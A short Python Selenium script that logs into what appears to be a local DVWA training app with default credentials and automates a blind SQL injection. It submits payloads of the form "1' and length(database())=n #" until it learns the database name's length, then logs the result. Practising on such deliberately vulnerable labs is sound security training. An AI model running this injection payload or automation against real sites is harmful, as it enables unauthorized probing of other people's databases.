from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager


def sqlinjection(host):
    timeToSleep = 1
    # create a new Chrome session
    s = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=s)

    # driver.implicitly_wait(30)
    driver.maximize_window()

    # navigate to the application home page
    driver.get(host+"/login.php")

    # get the search textbox
    username = driver.find_element("name", "username")
    password = driver.find_element("name", "password")

    # enter search keyword and submit
    username.send_keys("admin")
    password.send_keys("password")
    login = driver.find_element("name", "Login")
    time.sleep(timeToSleep)
    login.click()

    # creating a log file
    fp = open('sqloutput.log', 'w')

    # Run this if db has not init
    try:
        create_db = driver.find_element("name", "create_db")
        create_db.click()
        time.sleep(timeToSleep+2)
        username.send_keys("admin")
        password.send_keys("password")
        login = driver.find_element("name", "Login")
    except:
        print("DB has been already initialized")

    driver.get(host+"/vulnerabilities/sqli_blind/")
    sucess_message = 'User ID exists in the database.'
    is_true = False
    db_size = 1
    while not is_true:
        inputElement = driver.find_element("name", "id")
        time.sleep(1)
        inputElement.send_keys(f"1' and length(database())={db_size} #")
        time.sleep(1)
        inputElement.send_keys(Keys.ENTER)
        time.sleep(1)
        elem = driver.find_element(By.CSS_SELECTOR, "pre")
        if elem.text == sucess_message:
            is_true = True
        else:
            db_size += 1

    text = f"Matched db name size : {db_size}"
    fp.write(text)
    fp.close()
    time.sleep(3)
    driver.close()


sqlinjection("http://localhost:8080")
